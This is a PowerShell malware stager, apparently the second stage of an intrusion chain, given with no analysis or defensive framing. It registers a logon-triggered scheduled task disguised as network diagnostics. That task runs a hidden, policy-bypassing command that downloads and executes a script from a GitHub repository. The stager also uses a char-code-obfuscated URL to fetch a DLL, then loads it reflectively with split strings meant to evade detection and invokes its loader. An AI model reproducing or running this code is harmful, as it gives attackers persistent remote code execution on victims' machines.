# Stage 2: Advanced Process Injection & Persistence Stager

# 1. Establish Persistence (Scheduled Task)
$taskName = "SystemDiagnosticNetUpdate"
$taskDesc = "System Maintenance for Network Diagnostics"
# The command pulls Stage 2 directly from GitHub
$taskCmd = "powershell.exe -NoP -W Hidden -EP Bypass -C ""IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/main/Integrity.ps1'))"""

if (-not (Get-ScheduledTask $taskName -ErrorAction SilentlyContinue)) {
    Register-ScheduledTask -TaskName $taskName -Action (New-ScheduledTaskAction -Execute $taskCmd) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Description $taskDesc -Force | Out-Null
}

# 2. Reflective Loading
$u='';@ (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,102,108,111,111,114,115,111,102,111,108,103,97,45,115,118,103,47,115,105,103,110,101,100,102,105,108,101,115,47,109,97,105,110,47,83,121,115,116,101,109,65,117,100,105,116,46,100,108,108).ForEach({$u+=[char]$_});
$d=(New-Object Net.WebClient).DownloadData($u);
$t=[type](<'System.Reflection.As' + 'sembly'>);
$a=$t::('Lo' + 'ad').Invoke($d);

# Invoke the Loader's entry point
$a.GetType('SystemAudit.Loader').GetMethod('Run').Invoke($null,$null);
